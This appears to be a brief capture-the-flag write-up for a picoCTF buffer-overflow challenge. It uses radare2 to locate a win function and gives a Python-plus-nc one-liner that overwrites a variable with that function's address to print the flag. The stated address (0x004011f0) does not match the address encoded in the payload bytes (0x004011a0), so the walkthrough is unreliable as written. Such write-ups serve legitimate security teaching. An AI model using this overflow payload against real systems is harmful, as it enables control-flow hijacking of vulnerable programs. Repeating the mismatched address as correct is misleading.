This challenge requires us to use a disassembly program to find the memory location of the Win function.

We need to overwrite the buffer so that the X variable contains the memory address of the Win function, then select the Print Flag option.

We'll use the radare2 reverse engineering framework to solve this challenge.

rabin2 -I chall
r2 -d -A chall
afl

Note the memory address of sym.win, 0x004011f0

We can use Python to feed the necessary bytes into the program to overflow the X variable, then trigger the Print Flag option:

python -c 'import sys; sys.stdout.buffer.write(b"\x32\x0a" + (b"\x41" * 32) + b"\xa0\x11\x40\x00\x0a\x34\x0a")' | nc mimas.picoctf.net number

Note that the memory address bytes have to be fed into the program in reverse order, since the binary uses little endian byte order, as indicated by the rabin2 output.